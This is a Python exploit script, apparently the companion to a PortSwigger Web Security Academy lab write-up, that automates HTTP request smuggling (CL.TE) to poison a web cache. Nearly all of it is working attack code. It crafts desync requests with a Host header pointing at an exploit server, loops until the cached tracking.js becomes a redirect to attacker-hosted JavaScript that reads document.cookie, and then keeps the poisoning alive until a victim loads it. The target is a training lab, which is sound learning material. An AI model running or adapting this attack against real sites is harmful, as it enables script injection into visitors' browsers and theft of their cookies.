#!/usr/bin/env python3
"""
Exploiting HTTP request smuggling to perform web cache poisoning
PortSwigger Web Security Academy -- HTTP Request Smuggling

Companion script for the writeup: 17-web-cache-poisoning-via-smuggling.md

What this does -- and the one manual step it can't do for you:
    Smuggles a complete GET /post/next?postId=3 request via CL.TE, with its
    Host header pointed at your exploit server, immediately followed by a
    request for the cacheable /resources/js/tracking.js file. Because the
    redirect endpoint builds its Location header from the request's own
    Host header, and the smuggled request sits queued in the back-end's
    response pipe, the front-end's cache can end up associating that
    redirect response with the JS file's URL. This isn't a single-shot
    operation -- it's a race between the smuggle and the front-end routing
    the JS request to the same poisoned back-end connection -- so this
    script fires POST(smuggle)+GET(tracking.js) pairs in a loop until the
    JS response turns into a redirect, then sustains the poisoning faster
    than the cache's max-age=30 window until the lab's simulated visitor
    triggers the payload.

    Before running this: go to your exploit server and store a page at "/"
    with body `alert(document.cookie)` and Content-Type:
    application/javascript (via the "Content-Type" dropdown, or by adding
    the header directly), then pass that exploit server's hostname as the
    second argument. That JS-hosting step happens through PortSwigger's
    exploit server UI/API, not through request smuggling itself, so it's
    outside what this script automates.

Usage:
    python 17-web-cache-poisoning-via-smuggling.py <lab-url> <exploit-server-host>
    e.g. python 17-web-cache-poisoning-via-smuggling.py \\
             https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net \\
             exploit-0a1b00fa03d9c8b6803b56b400eb00d5.exploit-server.net

Requirements:
    pip install httpx
"""

import socket
import ssl
import sys
import time
from urllib.parse import urlparse

import httpx


def create_ssl_connection(host: str, port: int = 443, timeout: float = 10.0) -> ssl.SSLSocket:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["http/1.1"])
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    return ctx.wrap_socket(sock, server_hostname=host)


def _lab_solved(base_url: str) -> bool:
    r = httpx.get(base_url + "/", verify=False)
    return "is-solved" in r.text


def exploit_clte_cache_poison(host: str, port: int, base: str, exploit_host: str,
                               redirect_path: str = "/post/next?postId=3",
                               js_path: str = "/resources/js/tracking.js",
                               max_attempts: int = 100,
                               sustain_seconds: int = 60) -> bool:
    """CL.TE cache poisoning: smuggle a redirect via Host header to poison
    a cached JS file. The oversized Content-Length: 10 with a 3-byte body
    (x=1) absorbs 7 extra bytes from whatever request follows on the
    connection -- without that padding the desync timing didn't line up
    reliably enough for the poisoned response to land where it needed to."""
    smuggled = (
        f"GET {redirect_path} HTTP/1.1\r\n"
        f"Host: {exploit_host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 10\r\n"
        f"\r\n"
        f"x=1"
    )
    body = f"0\r\n\r\n{smuggled}"
    cl = len(body)
    poison_req = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {cl}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{body}"
    ).encode()

    def _send_poison():
        try:
            conn = create_ssl_connection(host, port)
            conn.sendall(poison_req)
            conn.settimeout(2)
            try:
                conn.recv(4096)
            except Exception:
                pass
            conn.close()
        except Exception:
            pass

    poisoned = False
    for i in range(max_attempts):
        _send_poison()
        r = httpx.get(f"{base}{js_path}", verify=False, follow_redirects=False)
        if r.status_code in (301, 302):
            print(f"[+] Cache poisoned at attempt {i + 1}: {r.headers.get('Location', '')}")
            poisoned = True
            break
        time.sleep(0.15)

    if not poisoned:
        print("[-] Failed to poison cache within max_attempts.")
        return False

    print(f"[*] Sustaining poisoning for {sustain_seconds}s until the victim hits it...")
    end = time.time() + sustain_seconds
    while time.time() < end:
        r = httpx.get(f"{base}{js_path}", verify=False, follow_redirects=False)
        if r.status_code not in (301, 302):
            for _ in range(5):
                _send_poison()
                r2 = httpx.get(f"{base}{js_path}", verify=False, follow_redirects=False)
                if r2.status_code in (301, 302):
                    break
                time.sleep(0.15)
        if _lab_solved(base):
            print("[+] Lab solved!")
            return True
        time.sleep(1)
    return _lab_solved(base)


def solve(lab_url: str, exploit_host: str) -> None:
    parsed = urlparse(lab_url)
    host = parsed.hostname
    port = 443 if parsed.scheme == "https" else 80
    base = f"{parsed.scheme}://{host}"

    solved = exploit_clte_cache_poison(host, port, base, exploit_host)
    print(f"[+] Solved: {solved}")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python {sys.argv[0]} <lab-url> <exploit-server-host>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"), sys.argv[2])
